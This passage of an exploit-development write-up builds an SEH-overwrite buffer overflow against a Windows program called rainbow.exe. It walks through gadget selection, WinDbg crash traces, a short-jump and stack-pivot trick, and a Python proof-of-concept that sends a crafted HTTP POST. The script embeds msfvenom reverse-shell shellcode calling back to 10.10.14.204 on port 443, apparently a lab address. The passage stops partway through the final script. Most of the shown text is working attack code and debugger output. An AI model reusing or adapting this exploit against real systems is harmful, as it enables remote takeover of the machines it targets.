0x409add:<span class="w"> </span>pop<span class="w"> </span>esi<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x409b09:<span class="w"> </span>pop<span class="w"> </span>esi<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
</code></pre></div>
<p>probably this one
</p><div class="highlight"><pre><span></span><code>0x4094d8: pop ecx ; pop ecx ; ret ; 
</code></pre></div><p></p>
<p>Removing the tail simplifies the buffer
</p><div class="highlight"><pre><span></span><code>    <span class="n">total_len</span> <span class="o">=</span> <span class="mi">3908</span>
    <span class="n">crash_len</span> <span class="o">=</span> <span class="mi">664</span>
    <span class="n">head</span> <span class="o">=</span> <span class="s2">"POST / HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s2">"</span>
    <span class="n">sled1</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x40</span><span class="s2">"</span> <span class="o">*</span> <span class="n">crash_len</span><span class="p">)</span>
    <span class="n">SEH</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\xd8\x94\x40</span><span class="s2">"</span>  <span class="c1">## 0x4094d8: pop ecx ; pop ecx ; ret ; </span>
    <span class="n">buf</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">head</span><span class="si">}{</span><span class="n">sled1</span><span class="si">}{</span><span class="n">SEH</span><span class="si">}</span><span class="s2">"</span>
</code></pre></div><p></p>
<p>New breakpoint; break on pop pop ret.
</p><div class="highlight"><pre><span></span><code><span class="o">((</span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">"taskkill /F /IM rainbow.exe"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe"</span><span class="w"> </span>-WF<span class="w"> </span>C:<span class="se">\w</span>indbg_custom.WEW<span class="w"> </span>-pn<span class="w"> </span>rainbow.exe<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bp 0x4094d8; g'</span>
</code></pre></div><p></p>
<p>Crash
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!exchain
009ff8e4:<span class="w"> </span>rainbow+a040<span class="w"> </span><span class="o">(</span>0040a040<span class="o">)</span>
009ff924:<span class="w"> </span>rainbow+a040<span class="w"> </span><span class="o">(</span>0040a040<span class="o">)</span>
009ffbe4:<span class="w"> </span>rainbow+94d8<span class="w"> </span><span class="o">(</span>004094d8<span class="o">)</span>
Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class="w"> </span>at<span class="w"> </span><span class="m">40404040</span>
<span class="m">0</span>:003&gt;<span class="w"> </span>t
Breakpoint<span class="w"> </span><span class="m">0</span><span class="w"> </span>hit
<span class="nv">eax</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">ebx</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">ecx</span><span class="o">=</span>004094d8<span class="w"> </span><span class="nv">edx</span><span class="o">=</span>775d9280<span class="w"> </span><span class="nv">esi</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">edi</span><span class="o">=</span><span class="m">00000000</span>
<span class="nv">eip</span><span class="o">=</span>004094d8<span class="w"> </span><span class="nv">esp</span><span class="o">=</span>009ff310<span class="w"> </span><span class="nv">ebp</span><span class="o">=</span>009ff330<span class="w"> </span><span class="nv">iopl</span><span class="o">=</span><span class="m">0</span><span class="w">         </span>nv<span class="w"> </span>up<span class="w"> </span>ei<span class="w"> </span>pl<span class="w"> </span>zr<span class="w"> </span>na<span class="w"> </span>pe<span class="w"> </span>nc
<span class="nv">cs</span><span class="o">=</span><span class="m">0023</span><span class="w">  </span><span class="nv">ss</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">ds</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">es</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">fs</span><span class="o">=</span><span class="m">0053</span><span class="w">  </span><span class="nv">gs</span><span class="o">=</span>002b<span class="w">             </span><span class="nv">efl</span><span class="o">=</span><span class="m">00000246</span>
rainbow+0x94d8:
004094d8<span class="w"> </span><span class="m">59</span><span class="w">              </span>pop<span class="w">     </span>ecx
<span class="m">0</span>:003&gt;<span class="w"> </span>t
<span class="nv">eax</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">ebx</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">ecx</span><span class="o">=</span>775d9262<span class="w"> </span><span class="nv">edx</span><span class="o">=</span>775d9280<span class="w"> </span><span class="nv">esi</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">edi</span><span class="o">=</span><span class="m">00000000</span>
<span class="nv">eip</span><span class="o">=</span>004094d9<span class="w"> </span><span class="nv">esp</span><span class="o">=</span>009ff314<span class="w"> </span><span class="nv">ebp</span><span class="o">=</span>009ff330<span class="w"> </span><span class="nv">iopl</span><span class="o">=</span><span class="m">0</span><span class="w">         </span>nv<span class="w"> </span>up<span class="w"> </span>ei<span class="w"> </span>pl<span class="w"> </span>zr<span class="w"> </span>na<span class="w"> </span>pe<span class="w"> </span>nc
<span class="nv">cs</span><span class="o">=</span><span class="m">0023</span><span class="w">  </span><span class="nv">ss</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">ds</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">es</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">fs</span><span class="o">=</span><span class="m">0053</span><span class="w">  </span><span class="nv">gs</span><span class="o">=</span>002b<span class="w">             </span><span class="nv">efl</span><span class="o">=</span><span class="m">00000246</span>
rainbow+0x94d9:
004094d9<span class="w"> </span><span class="m">59</span><span class="w">              </span>pop<span class="w">     </span>ecx
<span class="m">0</span>:003&gt;<span class="w"> </span>t
<span class="nv">eax</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">ebx</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">ecx</span><span class="o">=</span>009ff414<span class="w"> </span><span class="nv">edx</span><span class="o">=</span>775d9280<span class="w"> </span><span class="nv">esi</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">edi</span><span class="o">=</span><span class="m">00000000</span>
<span class="nv">eip</span><span class="o">=</span>004094da<span class="w"> </span><span class="nv">esp</span><span class="o">=</span>009ff318<span class="w"> </span><span class="nv">ebp</span><span class="o">=</span>009ff330<span class="w"> </span><span class="nv">iopl</span><span class="o">=</span><span class="m">0</span><span class="w">         </span>nv<span class="w"> </span>up<span class="w"> </span>ei<span class="w"> </span>pl<span class="w"> </span>zr<span class="w"> </span>na<span class="w"> </span>pe<span class="w"> </span>nc
<span class="nv">cs</span><span class="o">=</span><span class="m">0023</span><span class="w">  </span><span class="nv">ss</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">ds</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">es</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">fs</span><span class="o">=</span><span class="m">0053</span><span class="w">  </span><span class="nv">gs</span><span class="o">=</span>002b<span class="w">             </span><span class="nv">efl</span><span class="o">=</span><span class="m">00000246</span>
rainbow+0x94da:
004094da<span class="w"> </span>c3<span class="w">              </span>ret
<span class="m">0</span>:003&gt;<span class="w"> </span>dd<span class="w"> </span>esp<span class="w"> </span>L1
009ff318<span class="w">  </span>009ffbe4
<span class="m">0</span>:003&gt;<span class="w"> </span>dd<span class="w"> </span>0x009ffbe4<span class="w"> </span>L10
009ffbe4<span class="w">  </span><span class="m">40404040</span><span class="w"> </span>004094d8<span class="w"> </span><span class="m">00000005</span><span class="w"> </span>009ffef0
009ffbf4<span class="w">  </span>004026b3<span class="w"> </span><span class="m">00546058</span><span class="w"> </span>005460e8<span class="w"> </span>005460e8
009ffc04<span class="w">  </span>009ffe74<span class="w"> </span>0019eca8<span class="w"> </span>0040b5a0<span class="w"> </span>005460a8
009ffc14<span class="w">  </span><span class="m">00000000</span><span class="w"> </span><span class="m">00000000</span><span class="w"> </span>0040b55c<span class="w"> </span>005464d0
</code></pre></div><p></p>
<p>Very nice, ret will return to the 0x40404040.  </p>
<h1 id="to-seh-or-nseh-that-is-the-question">To SEH or nSEH, that is the question<a class="headerlink" href="#to-seh-or-nseh-that-is-the-question" title="Permanent link">¶</a></h1>
<p>Not much of a question</p>
<p>Need a small kickback, maybe 0x8 bytes.
</p><div class="highlight"><pre><span></span><code>nasm<span class="w"> </span>&gt;<span class="w"> </span>jmp<span class="w"> </span>short<span class="w"> </span>0xf8
<span class="m">00000000</span><span class="w">  </span>EBF6<span class="w">              </span>jmp<span class="w"> </span>short<span class="w"> </span>0xfffffff8
</code></pre></div><p></p>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nv">total_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3908</span>
<span class="w">    </span><span class="nv">crash_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">664</span>-4
<span class="w">    </span><span class="nv">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"</span>
<span class="w">    </span><span class="nv">sled1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="s2">"\x40"</span><span class="w"> </span>*<span class="w"> </span>crash_len<span class="o">)</span>
<span class="w">    </span><span class="nv">nSEH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\x90\x90\xeb\xf0"</span><span class="w">  </span><span class="c1">## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2</span>
<span class="w">    </span><span class="nv">SEH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\xd8\x94\x40"</span><span class="w">  </span><span class="c1">## 0x4094d8: pop ecx ; pop ecx ; ret ; </span>
<span class="w">    </span><span class="nv">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>f<span class="s2">"{head}{sled1}{nSEH}{SEH}"</span>
</code></pre></div>
<p>Very nice... three dwords worth of space after the short jump.
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>dd<span class="w"> </span>eip
00a0fbd8<span class="w">  </span><span class="m">40404040</span><span class="w"> </span><span class="m">40404040</span><span class="w"> </span><span class="m">40404040</span><span class="w"> </span>f0eb9090
</code></pre></div><p></p>
<p>At this time, the beginning of the usable range is about 648 bytes back
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>dd<span class="w"> </span>eip-0n648
00a0f950<span class="w">  </span><span class="m">40404040</span><span class="w"> </span><span class="m">40404040</span><span class="w"> </span><span class="m">40404040</span><span class="w"> </span><span class="m">40404040</span>
00a0f960<span class="w">  </span><span class="m">40404040</span><span class="w"> </span><span class="m">40404040</span><span class="w"> </span><span class="m">40404040</span><span class="w"> </span><span class="m">40404040</span>
</code></pre></div><p></p>
<p>registers
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>r
<span class="nv">eax</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">ebx</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">ecx</span><span class="o">=</span>00a0f414<span class="w"> </span><span class="nv">edx</span><span class="o">=</span>775d9280<span class="w"> </span><span class="nv">esi</span><span class="o">=</span><span class="m">00000000</span><span class="w"> </span><span class="nv">edi</span><span class="o">=</span><span class="m">00000000</span>
<span class="nv">eip</span><span class="o">=</span>00a0fbd8<span class="w"> </span><span class="nv">esp</span><span class="o">=</span>00a0f31c<span class="w"> </span><span class="nv">ebp</span><span class="o">=</span>00a0f330<span class="w"> </span><span class="nv">iopl</span><span class="o">=</span><span class="m">0</span><span class="w">         </span>nv<span class="w"> </span>up<span class="w"> </span>ei<span class="w"> </span>pl<span class="w"> </span>zr<span class="w"> </span>na<span class="w"> </span>pe<span class="w"> </span>nc
<span class="nv">cs</span><span class="o">=</span><span class="m">0023</span><span class="w">  </span><span class="nv">ss</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">ds</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">es</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">fs</span><span class="o">=</span><span class="m">0053</span><span class="w">  </span><span class="nv">gs</span><span class="o">=</span>002b<span class="w">             </span><span class="nv">efl</span><span class="o">=</span><span class="m">00000246</span>
</code></pre></div><p></p>
<p>Need to add about 0x648 hex to esp and jump there. But need to do it in a way that avoids null bytes.  In python:</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mh">0x964</span><span class="o">-</span><span class="mh">0x31c</span><span class="p">)</span>
<span class="s1">'0x648'</span>

<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mh">0x00a3f31c</span> <span class="o">+</span> <span class="mh">0xfffff648</span><span class="p">)</span>
<span class="s1">'0x100a3e964'</span>
</code></pre></div>
<p>Not quite right though, it's about 0x1000 off.</p>
<p>So instead it would make more sense to just write directly to the lower half of the dword.   Something like:
</p><div class="highlight"><pre><span></span><code>mov sp,0xf952; jmp esp
</code></pre></div><p></p>
<p>The following should align, with a placeholder for shellcode
</p><div class="highlight"><pre><span></span><code>    <span class="n">crash_len</span> <span class="o">=</span> <span class="mi">664</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">12</span>
    <span class="n">head</span> <span class="o">=</span> <span class="s2">"POST / HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s2">"</span>
    <span class="n">sled1</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span> <span class="o">*</span> <span class="mh">0x14</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">crash_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">sled1</span><span class="p">)))</span>
    <span class="n">nnSEH</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s2">"</span><span class="se">\x66\xbc\x52\xf9</span><span class="s2">"</span>  <span class="c1">## mov sp, 0xf952</span>
        <span class="s2">"</span><span class="se">\xff\xe4</span><span class="s2">"</span>              <span class="c1">## jmp esp</span>
        <span class="s2">"</span><span class="se">\x90\x90\x90\x90\x90\x90</span><span class="s2">"</span>
    <span class="p">)</span> 
    <span class="n">nSEH</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x90\x90\xeb\xf0</span><span class="s2">"</span>  <span class="c1">## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2</span>
    <span class="n">SEH</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\xd8\x94\x40</span><span class="s2">"</span>  <span class="c1">## 0x4094d8: pop ecx ; pop ecx ; ret ; </span>

    <span class="n">buf</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">head</span><span class="si">}{</span><span class="n">sled1</span><span class="si">}{</span><span class="n">shellcode</span><span class="si">}{</span><span class="n">nnSEH</span><span class="si">}{</span><span class="n">nSEH</span><span class="si">}{</span><span class="n">SEH</span><span class="si">}</span><span class="s2">"</span>
</code></pre></div><p></p>
<p>After jmp esp, Perfect.  Land right at the beginning of <code>sled1</code>
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>dd<span class="w"> </span>eip
009ef950<span class="w">  </span><span class="m">90909090</span><span class="w"> </span><span class="m">90909090</span><span class="w"> </span><span class="m">90909090</span><span class="w"> </span><span class="m">90909090</span>
009ef960<span class="w">  </span><span class="m">90909090</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span>
009ef970<span class="w">  </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span>
009ef980<span class="w">  </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span>
009ef990<span class="w">  </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span><span class="w"> </span><span class="m">41414141</span>
</code></pre></div><p></p>
<h1 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">¶</a></h1>
<p>The only thing left to do is generate the shellcode and complete the PoC.
</p><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">re</span><span class="o">,</span><span class="w"> </span><span class="nn">socket</span><span class="o">,</span><span class="w"> </span><span class="nn">binascii</span><span class="o">,</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span><span class="p">,</span> <span class="n">unpack</span>

<span class="n">badchars</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x00\x0a</span><span class="s2">"</span>
<span class="k">def</span><span class="w"> </span><span class="nf">gen_badchars</span><span class="p">(</span><span class="n">bc</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="s2">"</span><span class="se">\x01</span><span class="s2">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="p">):</span>
    <span class="n">s_int</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
    <span class="n">e_int</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">end</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
    <span class="n">BC</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">s_int</span><span class="p">,</span><span class="n">e_int</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">bc</span><span class="p">:</span>
        <span class="n">BC</span> <span class="o">=</span> <span class="n">BC</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">item</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">BC</span>

<span class="k">def</span><span class="w"> </span><span class="nf">cx</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">recv</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">recv</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">sock</span>

<span class="k">def</span><span class="w"> </span><span class="nf">sender</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">send</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">recv</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">send</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">recv</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"USAGE: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> ip:port"</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">":"</span><span class="p">)</span>
        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
        <span class="n">sock</span> <span class="o">=</span> <span class="n">cx</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">crash_len</span> <span class="o">=</span> <span class="mi">664</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">12</span>
    <span class="n">head</span> <span class="o">=</span> <span class="s2">"POST / HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s2">"</span>
    <span class="n">sled1</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span> <span class="o">*</span> <span class="mh">0x14</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
        <span class="c1">## msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.204 LPORT=443 EXITFUNC=thread -b "\x00\x0a" -f c</span>
        <span class="s2">"</span><span class="se">\xba\x92\xee\x4a\x91\xda\xcb\xd9\x74\x24\xf4\x58\x2b\xc9</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\xc2\xe0\xa8\x64\x1e</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x14\xae\x87\xde\xe5\xcf\x0e\x3b\xd4\xcf\x75\x48\x47\xe0</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xfe\x1c\x64\x8b\x53\xb4\xff\xf9\x7b\xbb\x48\xb7\x5d\xf2</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x49\xe4\x9e\x95\xc9\xf7\xf2\x75\xf3\x37\x07\x74\x34\x25</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xea\x24\xed\x21\x59\xd8\x9a\x7c\x62\x53\xd0\x91\xe2\x80</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xa1\x90\xc3\x17\xb9\xca\xc3\x96\x6e\x67\x4a\x80\x73\x42</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x04\x3b\x47\x38\x97\xed\x99\xc1\x34\xd0\x15\x30\x44\x15</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x91\xab\x33\x6f\xe1\x56\x44\xb4\x9b\x8c\xc1\x2e\x3b\x46</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x71\x8a\xbd\x8b\xe4\x59\xb1\x60\x62\x05\xd6\x77\xa7\x3e</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xe2\xfc\x46\x90\x62\x46\x6d\x34\x2e\x1c\x0c\x6d\x8a\xf3</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x31\x6d\x75\xab\x97\xe6\x98\xb8\xa5\xa5\xf4\x0d\x84\x55</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x05\x1a\x9f\x26\x37\x85\x0b\xa0\x7b\x4e\x92\x37\x7b\x65</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x62\xa7\x82\x86\x93\xee\x40\xd2\xc3\x98\x61\x5b\x88\x58</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x8d\x8e\x1f\x08\x21\x61\xe0\xf8\x81\xd1\x88\x12\x0e\x0d</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xa8\x1d\xc4\x26\x43\xe4\x8f\x42\x9e\xe8\x83\x3b\x9c\xf4</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x1a\x07\x29\x12\x76\x67\x7c\x8d\xef\x1e\x25\x45\x91\xdf</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xf3\x20\x91\x54\xf0\xd5\x5c\x9d\x7d\xc5\x09\x6d\xc8\xb7</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x9c\x72\xe6\xdf\x43\xe0\x6d\x1f\x0d\x19\x3a\x48\x5a\xef</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x33\x1c\x76\x56\xea\x02\x8b\x0e\xd5\x86\x50\xf3\xd8\x07</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x14\x4f\xff\x17\xe0\x50\xbb\x43\xbc\x06\x15\x3d\x7a\xf1</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xd7\x97\xd4\xae\xb1\x7f\xa0\x9c\x01\xf9\xad\xc8\xf7\xe5</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x1c\xa5\x41\x1a\x90\x21\x46\x63\xcc\xd1\xa9\xbe\x54\xf1</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x4b\x6a\xa1\x9a\xd5\xff\x08\xc7\xe5\x2a\x4e\xfe\x65\xde</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\x2f\x05\x75\xab\x2a\x41\x31\x40\x47\xda\xd4\x66\xf4\xdb</span><span class="s2">"</span>
        <span class="s2">"</span><span class="se">\xfc</span><span class="s2">"</span><span class="c1">## 351</span>
    <span class="p">)</span>
    <span class="n">sled2</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">crash_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">sled1</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
    <span class="n">nnSEH</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s2">"</span><span class="se">\x66\xbc\x50\xf9</span><span class="s2">"</span>  <span class="c1">## mov sp, 0xf950</span>
        <span class="s2">"</span><span class="se">\xff\xe4</span><span class="s2">"</span>              <span class="c1">## jmp esp</span>
        <span class="s2">"</span><span class="se">\x90\x90\x90\x90\x90\x90</span><span class="s2">"</span>
    <span class="p">)</span> 
    <span class="n">nSEH</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x90\x90\xeb\xf0</span><span class="s2">"</span>  <span class="c1">## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2</span>
    <span class="n">SEH</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\xd8\x94\x40</span><span class="s2">"</span>  <span class="c1">## 0x4094d8: pop ecx ; pop ecx ; ret ; </span>

